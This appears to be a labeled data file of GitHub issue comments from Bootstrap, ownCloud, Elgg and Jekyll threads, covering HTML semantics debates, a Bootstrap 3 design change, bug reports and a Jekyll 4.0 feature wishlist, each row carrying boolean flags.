bootstrap/twbs/7482/16069390,&lt;code&gt;hgroup&lt;/code&gt; would not have been more appropriate as it promotes a markup anti-pattern of using multiple headings when not needed.  h1-h6 do not make good subheadings/subtitles/taglines. ,False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/16069994,"There's nothing inherently true about that, Steve. ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/16071663,"@friend  So we need to use you instead as a perfect practice advisor ? right now I think there is not a only one or perfect way to do html5, everything is changing, that's include the specs, look at hgroup... as you said, the validator is a guide, specs are a guide too, to make a good practice of html5 not to convert developers to specs Nazis ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/16071959,"regarding @friend's comment about the validator, and to counter the snark he got just now from @friend  the validator does the equivalent of a fancy spellcheck. using spellchecking in your word processor does not guarantee that you're a good writer... the most important shortcoming of validators is that they can't check whether or not semantics are being appropriately conveyed. and that's what ian meant by that. heck, i can mark up an entire book as a single-page HTML file using only spans, and the validator wouldn't care...but any human looking at it would immediately see the problem. ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/16072191,"back to the topic this is, once again, an issue with nebulous spec language (and the original desire to retrospectively bless clearly presentational old-school tags with some form of ""semantics"" instead of ripping them out). it comes down to divining ""what did the spec authors really mean by that"" and drawing your own conclusions from it to fit your view. i'd actually say that there are bigger issues to tackle, and that - whether or not it's a slight misuse or not of the particular element - at least it doesn't do any harm (or good either, as no screenreader, scraper, etc actually care about small or misuse of i etc). ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/16072306,@friend how so? The practice of using multiple headings to indicate subtitles had been no more common that other methods. as defined hgroup promoted this one method. As defined hgroup would have resulted (if the semantics were implemented) in the same outcome for assistive technology users as the small pattern in discussion i.e. the hgroup was defined to be the heading and the semantics of the individual headings removed. ,False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/16072314,"""My point is in a huge app 6 chars can be a significant improvement"" in an age of minifaction, gzipping, etc, i'd really like to see some evidence of this sort of statement (which has often been quoted when it comes to the use of things like &lt;i&gt; and &lt;b&gt;)... ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/16101897,In the Name of the Moon specs will punish you! ,False,True,False,bootstrap/twbs/7482
bootstrap/twbs/8662/17299941,Are you serious guys? No more gradients and no more shadows? Should this be a button?  No it isnt!  And its a terrible decision to follow design regressions like Windows 8 and iOS7. How dare you! ,False,True,False,bootstrap/twbs/8662
bootstrap/twbs/8662/21668525,"It's not about following design trends. In my view Bootstrap is a framework on which you build your styles on top. This way people don't have to remove already applied styles by Bootstrap. (including all the IE styles, like filternone) ",False,True,False,bootstrap/twbs/8662
bootstrap/twbs/8662/21668582,"@friend I don't think that's a valid argument, since this new design is very different from the browser default, but the bootstrap 2 one is close enough to not change the style of it at all if you want something that most people will recognize. ",False,True,False,bootstrap/twbs/8662
bootstrap/twbs/8662/21669922,"Don't worry. There are plans to bring back the gradients, etc. as an optional theme. As for why they're no longer the default, @friend's explanation is correct. ",False,True,False,bootstrap/twbs/8662
bootstrap/twbs/8662/21670029,"Yup! Yup! Yes it is! We're not exactly following Windows 8 or iOS 7—if you step back and think through what it means to be a bootstrapping framework, you'll understand why we've simplified things. Easier overrides and fewer lines of code are *huge8 advantages. This isn't about trends. I know, right!? Ugh. Cool—see you around then! &lt;3 ",False,True,False,bootstrap/twbs/8662
bootstrap/twbs/8662/21673707,"@friend let me know I probably came off as an ass there, so let me apologize for that and explain my (unclear) sarcastic comments. I'll try to avoid doing this in the future so they're no confusion. Yes, we really are serious—the gradients are gone. Some shadows still exist—e.g., active button states—but largely the embellishments have been removed. The intention is to enable easier overrides and customization for folks who treat Bootstrap as a first-step, not an end solution. None of these changes in v3 are terrible, and that subjective feedback doesn't help us much unfortunately, so we can't really act on it to help you. It's opinion, not constructive criticism. If there's something we can do better, tell us directly what and how. That's good and useful feedback. Being told ""How dare you!"" suffers the same problem—it's not useful or constructive to us improving anything in Bootstrap. And seeing how this is a project we created, one that we have poured thousands of hours into over the last two years, I dare say we have the right to do what we like with it. That's not intended to show arrogance—it's simply a project we maintain and iterate on with the community's help, and I think our strategy of design/development has worked out quite well for us and everyone else using Bootstrap. Lastly, I truly am saddened that you're not excited (I am!), but once again, being told something like that doesn't help us at all. Similar to some folks' approach to product design, we're not in the business of trying to appease one single user's emotional feedback. It simply doesn't scale and isn't actionable at all. It sucks, but if that's your attitude, you can bet any hope of feedback you're trying to share will be ignored. Again, apologies for any offense given and hope that helps elaborate on my previous comment. &lt;3 ",False,True,False,bootstrap/twbs/8662
bootstrap/twbs/8662/21685937,"Im sorry i didnt know that its not a design decision. I pretty liked about bootstrap that e.g. the buttons are prestyled pretty nicely so it took me off much work. And bootstrap sites looked very nice out of the box. I appreciate you removed the styles for easier overrides. In addition to this i would like to suggest  Style the bootstrap page a little more Give the basic bootstrap version a little bit more theming and an additional option in less files and / or on custimization page to deactivate this ""theme"".  Am 28.07.2013 um 0034 schrieb Mark Otto notifications@friend.com ",False,True,False,bootstrap/twbs/8662
core/owncloud/3585/15091877,"Expected behaviour When I click on a day in the month view of the calendar, I expect to create an event for that day. Actual behaviour The date in the new-event popup is set to the day before the one I clicked on. Steps to reproduce  Login at your ownCloud site. Go to the calendar. Make sure it's in Month view. Click on a day. This will open a create-new-event popup.  Server configuration Operating system Ubuntu 12.04 LTS Web server Hiawatha 9.1 Database SQLite PHP version 5.3.10-1ubuntu3.6 ownCloud version 5.0.6 Client configuration Browser Firefox 21 Operating system MacOS X 10.8 ",False,True,False,core/owncloud/3585
core/owncloud/3585/18876248,Open in the calendar repo please ,False,True,False,core/owncloud/3585
core/owncloud/3585/18877087,This is not how you should handle a bug report... ,False,True,False,core/owncloud/3585
core/owncloud/3585/18877279,Some of us are much worse when bug reports aren't done correctly. ) Github doesn't let us move them and it was in contributing file. I want to reorder that... ,False,True,False,core/owncloud/3585
core/owncloud/3585/18877817,"Then those 'some of you' should change their attitude. The least one can do to people who are trying to help is to be polite. This is not addressed to you MTGap, just to those 'some of us' you are referring to. ",False,True,False,core/owncloud/3585
Elgg/Elgg/1547/11069923,"Original ticket  on 40150292-04-11 by trac user feeno, assigned to unknown. Elgg version 1.6 This just happened on community.elgg.org.  Visit web site to evaluate their award-winning web software.  Click “Sign up!”  Enter my email address and my desired username and password. Click Submit.  Error message appears “Your password is too short.”  OK, enter a different password and click Submit.  Error message appears “That email address is already registered.”   &lt;uh oh...&gt;  Jump back to home page, find Log In box, and on a whim, click “Forgot password”. Enter the username I chose earlier you know, the one that never successfully registered?  Mail is sent to my email address with a link to “confirm your email address”.  Click it.  Browser opens on web site, with message, “Your email address has been confirmed!”   &lt;eeeek...&gt;  I try logging in with my username and password. I get the error, “We couldn't log you in. This may be because you haven't validated your account yet....”  &lt;GAAAHH!!&gt;  Email arrives in my mailbox “Congratulations, you have successfully validated your email address.”  &lt;NoooOOOOOO!&gt;  File bug report “I’d like to introduce your software team to a cool new feature called a DATABASE TRANSACTION.”  ",False,True,False,Elgg/Elgg/1547
Elgg/Elgg/1547/13655414,brettp wrote on 40150313-09-02  Check the attitude at the login page. Submit concise and useful tickets to help better the project.  ,False,True,False,Elgg/Elgg/1547
Elgg/Elgg/1547/13655415,Milestone changed to  by brettp on 40150313-09-02 ,False,True,False,Elgg/Elgg/1547
Elgg/Elgg/1547/13655416,"trac user feeno wrote on 40150369-03-09 My report is a thorough, step-by-step use case for reproducing the bug. Apologies for the attitude. Consider it a view into the frustration that a first-time user experienced with the product.  And note that I did submit a ticket, when another first-time user would have just closed the browser and never come back. The account in question has username ""Feeno"".  Good luck debugging. ",False,True,False,Elgg/Elgg/1547
Elgg/Elgg/1547/13655418,cash wrote on 40184911-08-16 Works fine on Elgg 1.7 - looks like the community site just needs to be upgraded ,False,True,False,Elgg/Elgg/1547
jekyll/jekyll/6948/316610337,"wave Hello everyone! Summer is coming, and so is the implementation period for Jekyll 4.0. That's right, it's time to get some breaking changes in. To accommodate for this, we're opening this issue to collect interesting ideas that people would like to see implemented in 4.0. Keep in mind that even if an idea receives a lot of support, there's no guarantee that it'll get implemented — that depends on if someone is free to actually implement it. We're all volunteers here, keep that in mind. Feel free to revive old feature requests, too, just not something that we've explicitly rejected. For an organized view of how we're consolidating ideas and features, check out our Project board ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/383451465,"I vote for #6293 Markdown links bidi support, in ,  by default. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/383690460,"Adding fetch / get for datafiles to core (or as an ""official"" addon/plugin) would be great, see the unloved / public domain source @   The code itself is about 40 lines, see ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/383692192,"Using the quik library for scaffolding. If you scaffold a new jekyll theme or plugin now all the code is ""hard-coded"" / ""hard-wired"". The scaffolding code itself is also ""hard-wired""  / ""hard-coded"", that is, not (re)usable for other projects. Using a (simple) ""generic"" scaffolding library such as quik you can turn any git(hub) repo (or directory/folder or zip archive) into a parametrized and scripted template scaffold. See the Jekyll Quick Starter Template / Scaffold - Build Your Own (Gem-Packaged) Theme as an example. PS Background / References - Talk Notes - Quik - The Missing Project Scaffolder (Library) for Ruby - Quick Start Your Ruby Gems, Jekyll Websites, Jekyll Themes 'n' More ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/383720956,Custom HTTP headers compatibility for Github Pages (Webrick isn't planned to support ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/383729613,@friend Let’s keep this restricted to Jekyll features. We don’t have any control over GitHub Pages. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/383754782,"I'd love to see automatic generation of tag and category archive pages in core (plugins like jekyll-archives do this, but none are whitelisted in GitHub Pages). I wrote up #6952 with my detailed rationale and a proposal of how it could work. Here's the TL;DR Code-wise, this snippet gets most of it across ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/383799753,"I know that this is markdown and not necessarily jekyll related, but my life would have been a thousand times easier if jekyll supported inline footnotes like so  ‘[^Footnote, p. 123]’ as apposed to the more tedious ‘’’ This is first reference1, this is the second2 ‘’’   Footnote, p.1&#8617; Footnote, p.2&#8617;   ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/383857231,@friend This depedens on the Markdown engine. Please ask  on Kramdown or CommonMark. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/384153347,First would like to say thank you to the Jekyll team for all the great work you all do. Jekyll is one my favorite frameworks to work with and I really do appreciate what you guys do!  Ok on to the request it would be great if there was a built-in way to paginate a list Jekyll collection items on a page. I know there is jekyll-paginate-v2 gem but it would be nice if there was a built in pagniation that worked for both post and collection items. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/384634593,"Hello all, my first post so go easy. I want to just say that I love Jekyll, I'm now using it on a lot of my web builds. One thing that has bothered me though, is that I've not been able to take advantage of the latest Jekyll features because a lot of the 3rd party CMS solutions I rely on for my clients use (cloudcannon, siteleaf and forestry) simply don't run the latest versions of Jekyll themselves. This forces me to have my folder structures in a really messy state and not take advantage of the latest features when developing locally. So if anyone at Jekyll could bend a few arms to get them to update that would be fab. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/384651313,"@friend It alwyas take some time to update to the latest version for services like GitHub Pages, Forestry, CloudCannon or Siteleaf because they need to run tests and adapt their tools. There's nothing Jekyll's core team can do about it. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/385148351,"I would like to see Nested Collections. I know there are alternatives to do this. But still if the Jekyll team can make it easier, that would be awesome.! ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/385407165,"@friend Great suggestion. I'll add a use case  Create a collection of static image files Add metadata like alt tags, captions, dimensions in sidecar files Loop through them to create a rich image gallery  Jekyll CMS services like Siteleaf could make great use of this feature. Siteleaf uploads static assets to an  collection. cc @friend ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/385857693,I would like to see the tags of collections included in site.tags. Thanks! ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386162200,Please please support for i18n. At least 2 languages. Many plug-ins break or don't work with ghpages. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386622387,build in support for content blocks and components ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386652799,@friend Can you elaborate? Do you mean something like includes? ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386685852,"I'd very much love to have native support for Coffeescript in much the same manner as Sass. Thus, we could define in This way one could create partials of  in well-structured folders with all of them compiling minified to one  file, even same way as you have  with all the imports of individual Sass files. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386769747,"it would be great to have more interactions with github, like pulling profile information (contributions, avatar, ), releases data - and convert it for proper publication. this would be vital for software website to create team and download pages that would not require multiple code changes ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386777055,also background section could get some improvements - building website that will look good on regular displays and retina quiet challenging. creating multiple backgrounds for could be the solution to decrease loading time ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386793771,@friend GitHub data should be part of GitHub-metadata plugin not Jekyll-core ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386797765,"@friend sorry, i just started with jekyll a week ago) this repo is on the list. at this time, i guess that this info could be pulled by , but shouldn't jekyll convert it for better (more universal) usage? ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386798166,"@friend This is off-topic, but FYI GitHub-metadata already provides access to these data through  namespace. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386798575,@friend my bad. guess i misfired with backgrounds as well? ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386798905,"@friend It looks like so, as Jekyll is fully agnostic when it comes what's get generated in the front-end, it just transforms files into HTML. You can use plugins like  and/or  to help you deal with responsive images. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386799085,"@friend thanks for the input! im looking for every jekyll plugin i can find, put majority is out of date and has no support, so it pushed me to propose these functions into core (not counting jekyll-originated plugins) ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386800657,(I) really love this ability to minimize comments on GitHub.. sparkles ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386803866,I would like to see an automated tool like Webpack integrated into Jekyll to handle Sass and Javascript.  Some of the biggest reasons are auto-prefixing for Sass and the ability to use ES6 syntax that can automatically be polyfilled with babel. I think having an automated tool handle the sass and javascript bits may speed up the compile time of Jekyll. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386804048,How is that..?? ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386833978,A big reason for me is when doing frontend work and the Sass folder has many nested folders and files Jekyll sass can be slow. I have found letting web pack handle the sass instead of Jekyll improves speed and developer happiness. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386843679,"I'd love to see Docker volume mounts work with Docker for Windows. Rails, Flask, Phoenix and Node applications that I've worked with all work fine in Docker for Windows. You volume mount in the code, make a change, and in milliseconds your change is reflected and ready to be seen in a browser. With Jekyll 3.8, this does not happen. The file change is reflected inside of the container, but the  command doesn't regenerate the file. Using  also doesn't work. Everything works fine under WSL but Jekyll is the only reason I have Ruby installed on my machine, mainly because every other app from every other language / framework works wonderfully with Docker. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/386856025,Jekyll Core doesn't handle pre-processing css and javascript. We have two plugins (both are written in Ruby)  (included in  by default) and . The speed improvements are probably due to the difference between  and ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/387056265,@friend  something like this ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/387239592,"When I see the repo, I though GitHub pages. It has similarity between. ,  etc.. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/387647384,"I would love to see an offically supported page generator from data files. With the stellar rise of ""headless"" (= API only) SaaS CMS systems static site generators have become the tool of choice for types of sites that they have not been considered for in the past. e.g. contentful.com  provides an official jekyll plugin that pulls all the CMS content into the Jekyll _data folder as yaml.  You can then use that content inside pages and include you've already created, but you can't actively create new pages from the SaaS CMS.  This is possible with other generators, but I'd like to stick with Jekyll due to your maturity and ecosystem. e.g. the site I'm maintaining is a mix of content maintained by techies directly in the jekyll git and content written and uploaded by less technical people in contentful. contentful triggers the redeploy on netlify.com  via  webhook when a new article was published. Overall a great stack, just that we have to rely on a somewhat unmaintained hacky ""page generator"" jekyll plugin to stitch it together. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/387790643,"One more suggestions (I'd be happy to help along) - The Jekyll Documention is fantastic and outstanding. But, what's wrong (or better how to make it more awesome)? Currently the documentation is part of the jekyll repo  and the layouts, styling, build scripts etc. is part of the documentation too - it's all mixed together. What's wrong with that? I'd say with its own dedicated markdown files in a repo it would be easier to contribute / edit / retarget etc. and with a ""proper"" docu (remote) theme  in its own repo it would be easy to reuse and change the theme too.   A while ago (dare I say years) I started to ""clean up"" as an example the documentation use ""plain vanilla"" markdown files in the manuscripts (book/documentation) format. See the Hyde Press Bookshelf live  and all the source repos  For the suggestion for Jekyll 4.0 it would just be a  new theme repo and a new docs repo (with markdown only). Would be great to see some booklets / guides / tutorials that could be made easily from the new docs repos using some (selected) pages etc.   Let me (us) know what you think. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/387794045,"I'd like an additional YAML file that defines site-wide variables so other programs can generate the file safely (instead of appending to ). It could be better if we can have something like  in  but I don't think it's necessary. Just allow loading extra variables from another file, even if the file name is hard-coded, would be enough. A typical use case would be when I write a custom script that pre-processes some file and show in the information generated site ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/387878154,Make internal linking easier. Like generating a JSON of internals links including anchors. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/388162247,"@friend If I understand correctly, you could do this sort of thing using two (or more) config files. You can use this build command flag to specify multiple config files Granted, this option is only available as a command line flag, so it wouldn't work if you're using GitHub Pages to build your site. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/388232674,@friend Thanks for the response. Command line flags is surely not a problem for me because I use Travis CI to build my site. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/388521708,"The ability to specify that collection items with the attribute  should still have their YAML data exposed in the backend  object. Presently, setting  makes the data entirely inaccessible, even on the backend. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389244841,"Would love to see a standardized implementation of a service worker built into Jekyll utilizing the methods in The offline cookbook. A way of configuring it so that you could easily designate what the 'shell app' is so that those files load from offline cache first, and then designating dynamic content (such as blog posts) that load from network first and only cache so many entries (since caching 100 blog posts is ridiculous). I realize these things can be done now, but finding a way to configure it to work perfectly with Jekyll would be amazing and save a lot of people the struggle of figuring out how to properly implement a service worker for it. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389414999,I would be grateful if you could resolve #6410. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389420714,It would be really beneficial for Jekyllers around the world if you guys could implement some sort of semi-automatic generation on  files based on a folder structure. This would be a massive improvement and a great way to document distributed services. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389716084,"I would like some nice to have plugin improvements  Include all enabled plugins in site.plugins, including those available from the Gemfile. Something like  for code is that is conditional on having certain plugins available.  Don't parse these conditional blocks unless the plugin is available, so code inside doesn't crash if the plugin isn't available.  ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389749422,Can you add a bit more detail here? How is this different from the current state? ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389797224,@friend This cannot be implemented because Liquid is parsed and rendered by the  gem. Jekyll only provides the means to use and extend Liquid constructs for use in template files. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389803714,Plugins using the group  in a  are not visible in liquid as . Only plugins in the  are visible in . This is useful for conditional behaviour like ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389805827,"Ah, I see. This mentions using partials as a workaround  all plugins available in  would allow for this. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389873052,"This would be such a useful feature, I wonder if we could find a workaround. Maybe instead of using the regular  tag, we create a new tag that acts like the  tag (so Liquid does not parse the contents, and then Jekyll will render the contents if the plugin is installed. This is just an ideas list. Let’s not let implementation details get in the way at this stage. We are programmers; anything is possible. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389876958,@friend Wow!! That's an awesome idea!!! We can easily create a new tag that is a combination of both  and  tags...  heart tada ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/389986861,"What do you think for SanitizeHelper, @friend and @friend ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/390288255,"Thus Jekyll is focused to create mostly frontend-only sites... it would be awesome to have a better way to organize our  in partials and get an  as a result. This way we could place all our partials in a  (defaults could be maybe ) and specify the output style with a style option in the  file like I know we have this with CoffeScript, but it is now fading away and  rising and raising due to the fact that  is an excellent modern CoffeeScript alternative. TL;DR It'll be very cool to see GitHub Pages sites with minified ES6 created from well structured javascript partials. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/391164424,"I would like to see a plugin that lets you loop through any directory's files. This could let you list, display, or include the files in the directory. This might look like ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/391171987,"@friend You can already do this by looping over I wrote up an example of doing this to build an image gallery, but it could be adapted to access any static files. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/391175752,"@friend The issue with that is that the files have to then be outputted into the main site. My main use case here is that I would like to be able to loop over files in a directory that won't be outputted or accessible to the public. For example, I have a slide deck split into various parts, which I then use  to put back in the main file. Current method - repeated includes Directory structure react/index.html _config.yml Preferred method - loop over directory But I have a lot of parts, and add to it / move it around a lot, so I'd rather do something like this By using this method, I could reorganize my files, add new ones, or delete them and I wouldn't have to change the slide deck itself. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/391220248,"@friend, I have a PR open for this in Minima, the default theme you get if you run . In that case, I based my cache off of , although I probably should go through the Cookbook to make sure I've covered all bases. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/393325414,"I proposed this in the old Jekyll 4 wishlist thread, but it'd be really nice to be able to have schemas for data, collections, frontmatter, etc. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/394292023,"I'd like to see Multiple Outputs baked in so for each .md file we can output the usual html as well as say amp and json files too. For example   referencing , , and  layout files respectively. It might also be nice to to be able to specify the same html page at different locations/paths. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/396959302,"My two biggest wishlist items give two new degrees of freedom/flexibility  Multiple Outputs, see #3041 Multiple Content Sections, see #246  Currently setting out to implement manually! 😨 ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/397028665,"User comments please, filterable and maybe with optional moderation. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/397043183,"@friend You can use Disqus or some similar software for that, it's way outside the scope of Jekyll as a static site generator. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/398275126,"Could you consider supporting language switching by processing files in po format, or by some other means? ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/398303328,"Hello Jekyll team! I love working with collections, but the current option  enforces generation of either all or none of the pages. Having more control about which item of the collection is output would be appreciated. The current way of putting  suppresses output, but also makes the document inaccessible (it does not show up while looping through the collection). Thank you for the good work so far! ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/399762508,"I'd say making it easier to filter content by date. At the moment, my understanding is posts/collection  field is coerced into a Ruby  object. Comparison with  is impossible without workaround (casting a variable in ). There is a bit of background about this in #6581. I see this from a Jekyll user standpoint and I don't know whether this sits better as a  logic or as a  operator logic. Thanks for making Jekyll such a nice tool -)  A plus one comment on @friend proposal I find remote data to be quite useful to avoid monolithic Jekyll setup. My use case would be to reference sub-projects on a main Jekyll websites, from remote JSON file and Atom feed. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/400253497,"Oh, and the only thing that keeps me continually considering whether I should switch to Hugo is speed. Can we find ways to make Jekyll  Much faster at generating the site? (why is Hugo so many times faster? - IDK) Much better at doing it incrementally? (perhaps with manual dependency hints)  ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/400266532,@friend Hugo is much faster because it's written in natively compiled Go rather than interpreted Ruby. We're not planning to change that. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/400398025,"@friend Ah, fair enough – but then, within the confines of interpreted Ruby, speed is on my wishlist! Mainly an issue when you get to 1,000+ page blogs/sites... I'd love to keep using Jekyll even here and beyond. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/400453666,"Speaking of Hugo … something like Shortcodes (in Hugo or in WordPress) would writing Markdown easier to me, because I can defer HTML constructs to another file (for example, generating HTML from JSON via a given partial, but denote where it should show up in my Markdown). Downside in my experience is, that the HTML looks broken once the plugin for the shortcode is removed … (because the shortcode is interpreted as text). So Jekyll should offer hooks for shortcodes. The implementation should happen in plugins. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/400456299,"Oh, and this wishlist reminded me on an „argument” I had with @friend over in  a couple of months ago. Would be handy to have a way to support internationalisation! ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/403271910,Add the ability to place the post and its files in the same folder. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/403422656,@friend Why can't you do this at present? ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/403427196,"@friend At present, static files within a  directory are ignored.. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/403454731,@friend FYI there's a plugin you can use that allows you to place static files in the same folder as the post. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/403996610,"@friend @friend On the hardware side of things, when there is a complaint about Jekyll taking a long time to generate pages, one could respond by saying “get a processor with more cores”. But from what I understand, Jekyll does not seem to leverage well multi-core processing when it comes to generating files. It’s a petty since taking advantage of many cores could decrease page generation by 4-8X considering that many personal computers these days have processors with about that many cores/threads. So leveraging the multi-thread capabilities of modern processors when generating pages is the suggestion. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/404034566,"@friend We can't leverage multiple cores because Ruby (the language Jekyll is written in), itself doesn't leverage them. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/404035287,"@friend Ruby certainly does support threads. The trick is making sure that we only render things in parallel that do not depend on each other, and how can you know that two pages do not interfere with each other without rendering them? ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/404035661,"@friend Yes, Ruby does support threads. But because of the , threads in Ruby are never actually run in parallel.. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/404036202,TIL 😭sobsob ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/404036651,"What if we made templates pure, or at least atomic? ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/404036758,@friend what's an example where two pages depend on each other? I can see this being an issue for includes or layouts but pages themselves should be independent of each other ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/404036779,Do elaborate further @friend ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/404036986,"@friend For example, an  could have a ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/405090985,Proper i18n support. There are many plug-ins but none of them is supported by GitHub Pages. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/406811511,PWA support out of the box.  There are some Jekyll plug-ins that do this already and their workaround and implemention is dead simple. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/406812195,@friend What would a Jekyll site look like as a Progressive Web App? Can you elaborate? ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/406816602,@friend I updated the initial comment/request with my thoughts on why this is a good thing to implement in the upcoming Jekyll 4.0. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/406817981,To benefit from PWA features I'd recommend the use of jekyll-pwaplugin  based on workbox 3 by Google. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/406820149,@friend jekyll-pwa is more of a Service Worker thingy than  thingy. 😂  I am talking about vanilla  and not Service Workers. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/406854122,"The ability to render includes only once. This question on Stack demonstrates the idea. To demonstrate why this is a great idea, here is a scenario that I have say you want to have a tag cloud in every one of your posts. You have  in your , which allows you to generate a tag cloud on every post so the user can have a better time navigating the site. Instead of generating a tag cloud for every post, it will be nice to have the ability to generate an include only once and then have it included in every post. In my case, this could decrease the generation of my blog from 1 minute to 4 seconds. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/406866903,"@friend The plugin mentioned in the StackOverflow you linked to,  is the best option available out there. However, there is a related proposal for getting similar support in Core #7108 .. ..and another (very distantly) related proposal at #7136 You may subscribe to the above PRs to stay notified about any developments on the proposals ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/412993142,"I was reading over the thoughts about Open Collective in the blog post HERE Moving towards a means to maintain the list of plugins better might be to move those lists to yaml files and/or individual yaml files. If each entry in a section of the list here Available Plugins Then we can make it easier for maintenance. You would simply add a yaml file in the appropriate location that corresponds to your section. The file would have the fields needed to be listed. This would be , , ...  Part of why that helps things is no merge conflicts even become possible. Refactoring that page becomes less impacted by people adding to the lists, and we can add in additional fields, like  that can be used to track the repository of the project in question. When a new breaking change comes into a PR, we can potentially use a bot/script to pull in all those files and if the repository url exists, that it checks for a given pattern (and ambitiously, opens a PR for an automated fix). All this can potentially also be achieved with a yaml file per section, but we dont gain as much in terms of potential merge conflicts, but this is a fairly straightforward data set at that point, so this might not even be a concern. Opening hundreds of yaml files does have the potential of adding on time to generate the site. Side note This also makes it extremely easy to keep the list alphabetically ordered. I know this is not exactly a solution to the idea ""Create a comprehensive official plugin and theme directory site"" but it does cause a shift in how we store the data we already have thats more inline with 